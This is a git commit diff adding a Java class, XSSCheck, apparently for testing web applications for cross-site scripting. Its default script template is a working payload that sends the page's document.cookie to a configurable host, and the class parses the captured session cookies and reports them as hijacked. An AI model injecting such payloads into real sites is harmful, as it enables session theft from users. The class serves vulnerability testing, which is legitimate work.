cd012bee583f0cb1651ad8a9ca567bee1fcd5b7a
Ilya <eljah@mail.ru>
2015-06-16 00:03:47 +0300

    XSSCheck class added

--- src/main/java/XSSCheck.java
+++ src/main/java/XSSCheck.java
@@ -1,3 +1,8 @@
+import org.apache.log4j.Logger;
+
+import java.text.MessageFormat;
+import java.util.*;
+
 /**
  * Created by Ilya Evlampiev on 13.06.15.
  */
@@ -5,11 +10,97 @@ public class XSSCheck {
     private String host;
     private int port;
     private String resource;
+    private String scriptTemplate = "<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>"; //generic template
+    private static final Logger log = Logger.getLogger(Admin.class);
 
-    XSSCheck(String host, int port, String resource)
-    {
-        this.host=host;
-        this.port=port;
-        this.resource=resource;
+    private boolean xssfound = false;
+    private String xssCookieValue;
+    private List<String> tokenizedCookies;
+    private Map<String, String> cookiesAndValues = new HashMap<String, String>();
+
+    XSSCheck(String host, int port, String resource) {
+        this.host = host;
+        this.port = port;
+        this.resource = resource;
+        log.info(MessageFormat.format(
+                "New XSS check is created with  host {0}, port {1,number}, resource {2} and script template {3}", host, port, resource, scriptTemplate));
     }
+
+    XSSCheck(String host, int port, String resource, String scriptTemplate) {
+        this.host = host;
+        this.port = port;
+        this.resource = resource;
+        this.scriptTemplate = scriptTemplate;
+        log.info(MessageFormat.format(
+                "New XSS check is created with  host {0}, port {1,number}, resource {2} and script template {3}", host, port, resource, scriptTemplate));
+    }
+
+    public String getXSS() {
+        log.info("The XSS string is requested");
+        return String.format(scriptTemplate, host, Integer.valueOf(port), resource);
+    }
+
+    public boolean getXSSFountStatus() {
+        log.info("The XSS fount status is requested");
+        return this.xssfound;
+    }
+
+    public void setXSSFountStatus(boolean set) {
+        log.info("The XSS fount status is set to " + set);
+        xssfound = set;
+    }
+
+    public void setXSSCookiesValue(String cookieValue) {
+        log.info("The XSS cookie value is set to " + cookieValue);
+        xssCookieValue = cookieValue;
+        log.info("The XSS cookie value is tokenized");
+        tokenizedCookies = Arrays.asList(xssCookieValue.split(";%20"));
+
+        for (String token : tokenizedCookies) {
+            String[] cookieAndValue = token.split("=");
+            if (cookieAndValue.length == 2) {
+                cookiesAndValues.put(cookieAndValue[0], cookieAndValue[1]);
+                log.info(MessageFormat.format(
+                        "Cookie: {0}; value: {1}", cookieAndValue[0], cookieAndValue[1]));
+            } else {
+                log.error("Cookie " + token + " can not be splitted to cookie and value");
+            }
+        }
+    }
+
+    public String getXSSCookieValue(String cookie) {
+        log.info("Value for `" + cookie + "` requested");
+        if (cookiesAndValues.containsKey(cookie)) {
+            String valueToReturn = cookiesAndValues.get(cookie);
+            log.info("Value for `" + cookie + "` is: " + valueToReturn);
+            return valueToReturn;
+        } else {
+            log.error("Cookie `" + cookie + "` is not obtained via XSS");
+            return null;
+        }
+    }
+
+    public boolean getXSSCookieHijacked(String cookie) {
+        log.info("Hijack event for `" + cookie + "` requested");
+        if (cookiesAndValues.containsKey(cookie)) {
+            String valueToReturn = cookiesAndValues.get(cookie);
+            log.info("Value for `" + cookie + "` is: " + valueToReturn);
+            return true;
+        } else {
+            log.error("Cookie `" + cookie + "` is not obtained via XSS");
+            return false;
+        }
+    }
+
+
+    public static void main(String[] args) {
+        XSSCheck x = new XSSCheck("localhost", 1123, "xss.gif");
+        System.out.println(x.getXSS());
+        x.setXSSCookiesValue("ui3=1429689085;%20wayback_server=1;%20visited=20150612;%20PHPSESSID=enrf51icap788bepa2688bs8h4;%20JSESSIONID=78FCA04398B47540F4792B2D723E920B");
+        x.getXSSCookieValue("visited");
+        x.getXSSCookieValue("visited2");
+        x.getXSSCookieHijacked("visited");
+        x.getXSSCookieHijacked("visited2");
+    }
+
 }
